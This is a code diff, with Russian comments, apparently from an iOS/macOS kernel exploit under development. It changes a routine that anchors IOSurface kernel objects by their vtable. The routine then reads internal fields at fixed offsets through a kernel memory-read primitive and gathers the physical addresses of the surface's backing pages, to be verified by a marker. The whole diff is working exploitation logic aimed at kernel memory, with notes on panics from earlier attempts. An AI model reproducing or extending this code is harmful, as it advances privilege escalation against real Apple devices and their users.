@@ -5786,48 +5786,64 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // проходила широкий фильтр и убивала нас дважды — паники 081559/082748)
     uint64_t paLo = kconstant(physBase);
     uint64_t paHi = paLo + kconstant(physSize);
-    // 1.9.105: эвристики закрыты (diff пуст в обоих прогонах, lvl2 ловил
-    // константы). Кандидаты = ВСЕ PA-shaped qword'ы окна объекта + один
-    // уровень по его указателям (backing живёт в IOMemoryDescriptor за
-    // IOSurface.ranges=0x360); решает ТОЛЬКО маркер-перебор ниже.
+    // 1.9.106: конец скан-эвристикам (кандидаты-константы 0x10122000000).
+    // Якорь старта объекта по VTABLE: у dst и src один класс → одинаковая
+    // vtable; самый ДАЛЬНИЙ общий kernel-ptr позади ID-поля = старт объекта.
+    // Дальше точные XPF-оффсеты: IOSurface.ranges @ +0x360 (→ IOMemoryDescriptor),
+    // rangeCount @ +0x3a4 (==1 для одностраничной 32x32 BGRA).
+    uint64_t objStartD = 0, objStartS = 0;
+    for (uint32_t back = 8; back <= 0x400 && back <= idOffD && back <= idOffS; back += 8) {
+        uint64_t vd = 0, vs = 0;
+        memcpy(&vd, pgD + idOffD - back, 8);
+        memcpy(&vs, pgS + idOffS - back, 8);
+        if (vd != vs) continue;
+        if (!kpLooksLikeKernelPointer(kp_untag_ptr(vd))) continue;
+        objStartD = surfObjVA - back;   // последний матч = самый дальний
+        objStartS = srcObjVA - back;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  vtable-якорь: старт dst @ %#llx, src @ %#llx %@",
+              (unsigned long long)objStartD, (unsigned long long)objStartS,
+              objStartD ? @"" : @"— НЕ НАЙДЕН (это не IOSurface-объекты?)"]);
+
     uint64_t candVA[16], candPA[16];
     int candN = 0;
-    for (int k = -0x100; k + 8 <= 0x300 && candN < 16; k += 8) {
-        int oD = (int)idOffD + k;
-        if (oD < 0 || oD + 8 > 0x4000) continue;
-        uint64_t q = 0;
-        memcpy(&q, pgD + oD, 8);
-        if (q >= paLo && q < paHi && !(q & 0x3FFF)) {
-            candVA[candN] = pageD + oD;
-            candPA[candN] = q;
-            kpNote(r, [NSString stringWithFormat:@"    кандидат(inline ID%+#x): PA=%#llx @ %#llx", k,
-                      (unsigned long long)q, (unsigned long long)(pageD + oD)]);
-            candN++;
-        }
-    }
-    for (int k = -0x100; k + 8 <= 0x300 && candN < 16; k += 8) {
-        int oD = (int)idOffD + k;
-        if (oD < 0 || oD + 8 > 0x4000) continue;
-        uint64_t q = 0;
-        memcpy(&q, pgD + oD, 8);
-        uint64_t u = kp_untag_ptr(q);
-        if (!kpLooksLikeKernelPointer(u)) continue;
-        uint8_t d2[0x200];
-        memset(d2, 0, sizeof(d2));
-        uint64_t pageEnd = (u & ~0x3FFFULL) + 0x4000;
-        uint32_t sz2 = (u + sizeof(d2) <= pageEnd) ? (uint32_t)sizeof(d2) : (uint32_t)(pageEnd - u);
-        if (sz2 < 8) continue;
-        if (!kpRead(u, d2, sz2, "cand lvl2", r)) continue;
-        for (uint32_t o2 = 0; o2 + 8 <= sz2 && candN < 16; o2 += 8) {
-            uint64_t q2 = 0;
-            memcpy(&q2, d2 + o2, 8);
-            if (q2 >= paLo && q2 < paHi && !(q2 & 0x3FFF)) {
-                candVA[candN] = u + o2;
-                candPA[candN] = q2;
-                kpNote(r, [NSString stringWithFormat:@"    кандидат(lvl2 ID%+#x→%#llx +%#x): PA=%#llx", k,
-                          (unsigned long long)u, o2, (unsigned long long)q2]);
+    if (objStartD) {
+        // гард: объект не должен пересекать страницу (иначе якорь соскочил)
+        if (((objStartD ^ (objStartD + 0x368)) & ~0x3FFFULL) == 0) {
+            uint64_t rangesRef = 0, rcnt = 0;
+            kpRead(objStartD + 0x360, &rangesRef, 8, "iosurf ranges", r);
+            kpRead(objStartD + 0x3a4, &rcnt, 8, "iosurf rangeCount", r);
+            kpNote(r, [NSString stringWithFormat:@"  [start+0x360] ranges = %#llx, [start+0x3a4] rangeCount = %llu",
+                      (unsigned long long)rangesRef, (unsigned long long)rcnt]);
+            // inline-вариант: сам ranges — PA
+            if (rangesRef >= paLo && rangesRef < paHi && !(rangesRef & 0x3FFF)) {
+                candVA[candN] = objStartD + 0x360;
+                candPA[candN] = rangesRef;
                 candN++;
             }
+            // обычный: ranges = указатель на IOMemoryDescriptor с ranges[0].pa
+            uint64_t u = kp_untag_ptr(rangesRef);
+            if (kpLooksLikeKernelPointer(u)) {
+                uint8_t d2[0x200];
+                memset(d2, 0, sizeof(d2));
+                uint64_t pageEnd = (u & ~0x3FFFULL) + 0x4000;
+                uint32_t sz2 = (u + sizeof(d2) <= pageEnd) ? (uint32_t)sizeof(d2) : (uint32_t)(pageEnd - u);
+                if (sz2 >= 8 && kpRead(u, d2, sz2, "iomd dump", r)) {
+                    for (uint32_t o2 = 0; o2 + 8 <= sz2 && candN < 16; o2 += 8) {
+                        uint64_t q2 = 0;
+                        memcpy(&q2, d2 + o2, 8);
+                        if (q2 >= paLo && q2 < paHi && !(q2 & 0x3FFF)) {
+                            candVA[candN] = u + o2;
+                            candPA[candN] = q2;
+                            kpNote(r, [NSString stringWithFormat:@"    кандидат(IOMD+%#x): PA=%#llx", o2, (unsigned long long)q2]);
+                            candN++;
+                        }
+                    }
+                }
+            }
+        } else {
+            kpNote(r, @"  якорь пересёк страницу — якорь неверен, стоп");
+            objStartD = 0;
         }
     }
     kpNote(r, [NSString stringWithFormat:@"  кандидатов backing PA: %d — доказываю маркером каждый", candN]);
